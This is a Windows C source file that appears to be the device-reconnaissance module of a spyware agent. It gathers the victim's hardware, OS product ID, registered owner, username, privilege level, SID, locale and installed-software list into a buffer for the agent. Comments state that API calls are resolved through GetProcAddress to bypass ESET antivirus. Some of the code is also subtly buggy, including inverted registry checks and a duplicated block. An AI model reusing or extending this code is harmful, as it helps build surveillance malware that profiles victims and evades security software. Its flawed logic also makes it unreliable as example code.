#include <Windows.h>
#include <Lm.h>
#include <Sddl.h>
#include <stdio.h>
#include "agent_device.h"


PDEVICE_CONTAINER pDeviceContainer = NULL;

VOID GetDeviceInfo()
{
	HKEY hKey;
	ULONG uLen;
	PDEVICE_INFO pDeviceInfo;
	if (pDeviceContainer != NULL)
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] GetDeviceInfo: structure already there\n");
#endif
		return;
	}

#ifdef _DEBUG
	OutputDebugString(L"[+] Starting GetDeviceInfo\n");
#endif
	
	pDeviceContainer = (PDEVICE_CONTAINER)malloc(sizeof(DEVICE_CONTAINER));
	pDeviceInfo = (PDEVICE_INFO)malloc(sizeof(DEVICE_INFO));
	memset(pDeviceInfo, 0x0, sizeof(DEVICE_INFO));
	
	// getprocaddr per bypass ESET
	typedef LONG (WINAPI *REGOPENKEYEXW)(__in HKEY hKey, __in LPWSTR lpSubKey, __in DWORD ulOptions, __in REGSAM samDesired, __out PHKEY phkResult);
	REGOPENKEYEXW fpRegOpenKeyEx = (REGOPENKEYEXW) GetProcAddress(LoadLibrary(L"advapi32"), "RegOpenKeyExW");
	typedef LONG (WINAPI *REGQUERYVALUEEX) (HKEY, LPWSTR, LPDWORD ,LPDWORD, LPBYTE, LPDWORD);
	REGQUERYVALUEEX pfn_RegQueryValueEx = (REGQUERYVALUEEX) GetProcAddress(LoadLibrary(L"advapi32"), "RegQueryValueExW");

	// Processor
	if (fpRegOpenKeyEx(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		uLen = sizeof(pDeviceInfo->procinfo.proc);
		if (RegQueryValueEx(hKey, L"ProcessorNameString", NULL, NULL, (PBYTE)pDeviceInfo->procinfo.proc, &uLen) != ERROR_SUCCESS)
		{
			pDeviceInfo->procinfo.proc[0] = L'\0';
#ifdef _DEBUG
			OutputDebugString(L"[!!] Cannot read ProcessorNameString\n");
#endif
		}

		RegCloseKey(hKey);
	}
	else
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] Cannot read HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0\n");
#endif
	}
	
	// num procs
	SYSTEM_INFO pSysInfo;
	memset(&pSysInfo, 0x0, sizeof(pSysInfo));
	GetSystemInfo(&pSysInfo);
	pDeviceInfo->procinfo.procnum = pSysInfo.dwNumberOfProcessors;

	// memory
	MEMORYSTATUSEX pMemoryStatus;
	memset(&pMemoryStatus, 0x0, sizeof(MEMORYSTATUSEX));
	pMemoryStatus.dwLength = sizeof(MEMORYSTATUSEX);
	GlobalMemoryStatusEx(&pMemoryStatus);
	pDeviceInfo->meminfo.memtotal = (ULONG)(pMemoryStatus.ullTotalPhys / (1024*1024));
	pDeviceInfo->meminfo.memfree = (ULONG)(pMemoryStatus.ullAvailPhys / (1024*1024));
	pDeviceInfo->meminfo.memload = (ULONG)(pMemoryStatus.dwMemoryLoad);
	
	// os
	//if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	if (fpRegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		uLen = sizeof(pDeviceInfo->osinfo.ver);
		if (pfn_RegQueryValueEx(hKey, L"ProductName", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.ver, &uLen) != ERROR_SUCCESS)
			pDeviceInfo->osinfo.ver[0] = L'\0';
		
		uLen = sizeof(pDeviceInfo->osinfo.sp);
		if (pfn_RegQueryValueEx(hKey, L"CSDVersion", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.sp, &uLen) != ERROR_SUCCESS)
			pDeviceInfo->osinfo.sp[0] = L'\0';
		
		
		WCHAR strProductId[] = { L'P', L'r', L'o', L'd', L'u', L'c', L't', L'I', L'd', L'\0' };
		uLen = sizeof(pDeviceInfo->osinfo.id);
		if (pfn_RegQueryValueEx(hKey, L"ProductId", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.id, &uLen) != ERROR_SUCCESS)
			pDeviceInfo->osinfo.id[0] = L'\0';
		
		uLen = sizeof(pDeviceInfo->osinfo.owner);
		if (pfn_RegQueryValueEx(hKey, L"RegisteredOwner", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.owner, &uLen) != ERROR_SUCCESS)
			pDeviceInfo->osinfo.owner[0] = L'\0';

		uLen = sizeof(pDeviceInfo->osinfo.org);
		if (pfn_RegQueryValueEx(hKey, L"RegisteredOrganization", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.org, &uLen) != ERROR_SUCCESS)
			pDeviceInfo->osinfo.org[0] = L'\0';
		
		RegCloseKey(hKey);
		
	}
	else
	{
		pDeviceInfo->osinfo.ver[0] = L'\0';
		pDeviceInfo->osinfo.sp[0] = L'\0';
		pDeviceInfo->osinfo.id[0] = L'\0';
		pDeviceInfo->osinfo.owner[0] = L'\0';
		pDeviceInfo->osinfo.org[0] = L'\0';
	}
	
	
	// user
	uLen = sizeof(pDeviceInfo->userinfo.username) / sizeof(WCHAR);
	if (!GetUserName(pDeviceInfo->userinfo.username, &uLen))
		pDeviceInfo->userinfo.username[0] = L'\0';

	PBYTE pUserInfo = NULL;
	pDeviceInfo->userinfo.priv = 0;

	if (NetUserGetInfo(NULL, pDeviceInfo->userinfo.username, 1, &pUserInfo) == NERR_Success)
		pDeviceInfo->userinfo.priv = ((PUSER_INFO_1)pUserInfo)->usri1_priv;		

	

	
	SecureZeroMemory(pDeviceInfo->userinfo.fullname, 0x2);
	SecureZeroMemory(pDeviceInfo->userinfo.sid, 0x2);


	typedef NET_API_STATUS (WINAPI *NETUSERGETINFO)(LPWSTR, LPWSTR, DWORD, LPBYTE*);
	NETUSERGETINFO pfn_NetUserGetInfo = (NETUSERGETINFO) GetProcAddress(LoadLibrary(L"netapi32"), "NetUserGetInfo");

	if (pfn_NetUserGetInfo(NULL, pDeviceInfo->userinfo.username, 23, &pUserInfo) == NERR_Success)
	{
		PWCHAR pSidStr = NULL;
		wcsncpy_s(pDeviceInfo->userinfo.fullname, sizeof(pDeviceInfo->userinfo.fullname) / sizeof(WCHAR), ((PUSER_INFO_23)pUserInfo)->usri23_full_name, _TRUNCATE);
		if (ConvertSidToStringSid(((PUSER_INFO_23)pUserInfo)->usri23_user_sid, &pSidStr))
			wcsncpy_s(pDeviceInfo->userinfo.sid, sizeof(pDeviceInfo->userinfo.sid) / sizeof(WCHAR), pSidStr, _TRUNCATE);
	}
	
	NetApiBufferFree(pUserInfo);
	
	
	// locale & timezone
	if (!GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO639LANGNAME, pDeviceInfo->localinfo.lang, sizeof(pDeviceInfo->localinfo.lang) / sizeof(WCHAR)))
		pDeviceInfo->localinfo.lang[0] = L'\0';
	if (!GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, pDeviceInfo->localinfo.country, sizeof(pDeviceInfo->localinfo.country) / sizeof(WCHAR)))
		pDeviceInfo->localinfo.country[0] = L'\0';

	pDeviceInfo->localinfo.timebias = 0;
	
	if (!RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
	{
		uLen = sizeof(ULONG);

		if (pfn_RegQueryValueEx(hKey, L"ActiveTimeBias", NULL, NULL, (PBYTE)&pDeviceInfo->localinfo.timebias, &uLen) != ERROR_SUCCESS)
			pDeviceInfo->localinfo.timebias = 0;

		RegCloseKey(hKey);
	}
	
	if (!RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
	{
		uLen = sizeof(ULONG);
		if (RegQueryValueEx(hKey, L"ActiveTimeBias", NULL, NULL, (PBYTE)&pDeviceInfo->localinfo.timebias, &uLen) != ERROR_SUCCESS)
			pDeviceInfo->localinfo.timebias = 0;

		RegCloseKey(hKey);
	}
	

	
	// disk	
	ULARGE_INTEGER uDiskFree, uDiskTotal;
	PWCHAR wPath = (PWCHAR)malloc(32767 * sizeof(WCHAR));
	
	if (!GetEnvironmentVariable(L"TMP", wPath, 32767 * sizeof(WCHAR)))
		wcsncpy_s(wPath, 32767 * sizeof(WCHAR), L"C:\\", _TRUNCATE);
	
	// GetProcAddress vari per bypass ESET 
	typedef BOOL (WINAPI *GETDISKFREESPACEEX) (LPWSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);	
	GETDISKFREESPACEEX pfn_GetDiskFreeSpaceEx = (GETDISKFREESPACEEX) GetProcAddress(LoadLibrary(L"kernel32"), "GetDiskFreeSpaceExW");
	
	if (pfn_GetDiskFreeSpaceEx(wPath, &uDiskFree, &uDiskTotal, NULL))
	{
		pDeviceInfo->diskinfo.disktotal = (ULONG) (uDiskTotal.QuadPart / (1024*1024));
		pDeviceInfo->diskinfo.diskfree = (ULONG) (uDiskFree.QuadPart / (1024*1024));
	}
	else
		pDeviceInfo->diskinfo.disktotal = pDeviceInfo->diskinfo.diskfree = 0;
	
	
	BOOL bIsWow64, bIsx64OS;
	IsWow64Process(GetCurrentProcess(), &bIsWow64);
	bIsx64OS = IsX64System();

	PWCHAR pApplicationList = GetApplicationList(FALSE);
	PWCHAR pApplicationList64 = NULL;

	if (bIsWow64)
		pApplicationList64 = GetApplicationList(TRUE);
		
	PWCHAR pDeviceString = (PWCHAR)malloc(sizeof(DEVICE_INFO)
		+ wcslen(pApplicationList) * sizeof(WCHAR) 
		+ (pApplicationList64 ? wcslen(pApplicationList64) * sizeof(WCHAR) : 0)
		+ 1024);
	
	_snwprintf_s(pDeviceString,
		sizeof(DEVICE_INFO)/sizeof(WCHAR) + wcslen(pApplicationList) + (pApplicationList64 ? wcslen(pApplicationList64) : 0) + 1024/sizeof(WCHAR),
		_TRUNCATE,
		L"CPU: %d x %s\n"
		L"RAM: %dMB free / %dMB total (%u%% used)\n"
		L"Hard Disk: %dMB free / %dMB total\n"
		L"\n"
		L"Windows Version: %s%s%s%s%s\n"
		L"Registered to: %s%s%s%s {%s}\n"
		L"Locale: %s_%s (UTC %.2d:%.2d)\n"
		L"\n"
		L"User Info: %s%s%s%s%s\n"
		L"SID: %s\n"
		L"\nApplication List (x86):\n%s\nApplicationList (x64):\n%s",
		pDeviceInfo->procinfo.procnum, pDeviceInfo->procinfo.proc,
		pDeviceInfo->meminfo.memfree, pDeviceInfo->meminfo.memtotal, pDeviceInfo->meminfo.memload,
		pDeviceInfo->diskinfo.diskfree, pDeviceInfo->diskinfo.disktotal,
		pDeviceInfo->osinfo.ver, (pDeviceInfo->osinfo.sp[0]) ? L" (" : L"", (pDeviceInfo->osinfo.sp[0]) ? pDeviceInfo->osinfo.sp : L"", (pDeviceInfo->osinfo.sp[0]) ? L")" : L"", bIsx64OS ? L" (64-bit)" : L" (32-bit)",
		pDeviceInfo->osinfo.owner, (pDeviceInfo->osinfo.org[0]) ? L" (" : L"", (pDeviceInfo->osinfo.org[0]) ? pDeviceInfo->osinfo.org : L"", (pDeviceInfo->osinfo.org[0]) ? L")" : L"", pDeviceInfo->osinfo.id,
		pDeviceInfo->localinfo.lang, pDeviceInfo->localinfo.country, (-1 * (int)pDeviceInfo->localinfo.timebias) / 60, abs((int)pDeviceInfo->localinfo.timebias) % 60,
		pDeviceInfo->userinfo.username, (pDeviceInfo->userinfo.fullname[0]) ? L" (" : L"", (pDeviceInfo->userinfo.fullname[0]) ? pDeviceInfo->userinfo.fullname : L"", (pDeviceInfo->userinfo.fullname[0]) ? L")" : L"", (pDeviceInfo->userinfo.priv) ? ((pDeviceInfo->userinfo.priv == 1) ? L"" : L" [ADMIN]") : L" [GUEST]",
		pDeviceInfo->userinfo.sid,
		pApplicationList,
		pApplicationList64 ? pApplicationList64 : L"");
	
	pDeviceContainer->pDataBuffer = (PBYTE)pDeviceString;
	pDeviceContainer->uSize = (wcslen(pDeviceString)+1)*sizeof(WCHAR);
	
	free(pApplicationList);
	free(pApplicationList64);
	free(pDeviceInfo);
	free(wPath);
	
	return;
}

PWCHAR GetApplicationList(BOOL bX64View)
{
	ULONG uLen, uIndex, uVal, uAppList;
	HKEY hKeyUninstall, hKeyProgram;
	WCHAR pStringValue[128], pProduct[256];
	PWCHAR pApplicationList = NULL;
	
	uLen = uIndex = 0;
	hKeyUninstall = hKeyProgram = NULL;

	ULONG uSamDesidered = KEY_READ;
	if (bX64View)
		uSamDesidered |= KEY_WOW64_64KEY;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, uSamDesidered, &hKeyUninstall) == ERROR_SUCCESS)
	{
		while (1)
		{
			if (hKeyProgram)
			{
				RegCloseKey(hKeyProgram);
				hKeyProgram = NULL;
			}

			uLen = sizeof(pStringValue) / sizeof(WCHAR);
			if (RegEnumKeyEx(hKeyUninstall, uIndex++, pStringValue, &uLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
				break;

 			if (RegOpenKeyEx(hKeyUninstall, pStringValue, 0, uSamDesidered, &hKeyProgram) != ERROR_SUCCESS)
				continue;

			if (!RegQueryValueEx(hKeyProgram, L"ParentKeyName", NULL, NULL, NULL, NULL))
				continue;

			// no windows security essential without this.
			uLen = sizeof(ULONG);
			if (!RegQueryValueEx(hKeyProgram, L"SystemComponent", NULL, NULL, (PBYTE)&uVal, &uLen) && (uVal == 1))
				continue;

			uLen = sizeof(pStringValue);
			if (RegQueryValueEx(hKeyProgram, L"DisplayName", NULL, NULL, (PBYTE)pStringValue, &uLen) != ERROR_SUCCESS)
				continue;

			wcsncpy_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), pStringValue, _TRUNCATE);

			uLen = sizeof(pStringValue);
			if (!RegQueryValueEx(hKeyProgram, L"DisplayVersion", NULL, NULL, (PBYTE)pStringValue, &uLen))
			{
				wcsncat_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), L"   (", _TRUNCATE);
				wcsncat_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), pStringValue, _TRUNCATE);
				wcsncat_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), L")", _TRUNCATE);
			}
			wcsncat_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), L"\n", _TRUNCATE);

			if (!pApplicationList)
			{
 				uAppList = wcslen(pProduct)*sizeof(WCHAR) + sizeof(WCHAR);
				pApplicationList = (PWCHAR)realloc(NULL,  uAppList);
				memset(pApplicationList, 0x0, uAppList);
			}
			else
			{
				uAppList = wcslen(pApplicationList)*sizeof(WCHAR) + wcslen(pProduct)*sizeof(WCHAR) + sizeof(WCHAR);
				pApplicationList = (PWCHAR)realloc(pApplicationList, uAppList);
			}
			wcsncat_s(pApplicationList, uAppList / sizeof(WCHAR), pProduct, wcslen(pProduct));
		}
	}
	
	return pApplicationList;
}

BOOL IsX64System()
{    
    SYSTEM_INFO SysInfo;

	GetNativeSystemInfo(&SysInfo);
	if(SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
		return FALSE;

	return TRUE;
}